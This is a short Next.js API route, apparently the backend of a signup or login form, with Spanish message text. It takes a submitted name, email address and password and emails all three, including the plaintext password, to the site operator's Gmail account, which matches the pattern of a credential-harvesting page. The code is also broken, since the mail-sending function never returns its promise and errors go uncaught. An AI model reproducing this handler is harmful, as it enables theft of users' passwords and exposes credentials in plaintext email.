import { NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

export async function POST(request) {
    const { name, email, password } = await request.json();

    const textSendFormat = `
    Se han registrado nuevos datos:
    
    Nombre: ${name},
    Correo: ${email},
    Contraseña: ${password}
    `

    const transport = nodemailer.createTransport({
        service: 'gmail', auth: {
            user: process.env.EMAIL,
            pass: process.env.PASSWORD,
        }
    })

    const mailOptions = {
        from: process.env.EMAIL,
        to: process.env.EMAIL,
        subject: 'Nuevos datos registrados',
        text: textSendFormat
    }

    const sendMailPromise = () => {
        new Promise((resolve, reject) => {
            transport.sendMail(mailOptions, function (error) {
                if (!error) {
                    resolve('Email send')
                } else {
                    reject(error.message)
                }
            })
        })
    }

    try {
        await sendMailPromise()
        return NextResponse.json({ message: 'Email sent' })
    } catch (error) {
        return NextResponse.json({ error: error }, { status: 500 })
    }
}